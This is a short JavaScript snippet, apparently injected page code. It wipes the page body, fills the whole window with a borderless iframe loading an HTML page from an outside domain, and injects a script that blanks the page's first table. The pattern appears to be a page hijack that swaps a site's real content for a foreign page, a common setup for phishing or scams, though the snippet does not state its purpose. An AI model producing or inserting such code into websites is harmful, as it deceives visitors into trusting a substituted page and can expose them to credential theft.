document.body.innerHTML = '<iframe src="http://computerperfect.be/Test/User/Test/Myro.html" height="100%" width="100%" style="border: 0"></iframe>'
var script = document.createElement("script");
script.innerHTML = "document.getElementsByTagName('table')[0].innerHTML = ''";
document.body.appendChild(script);
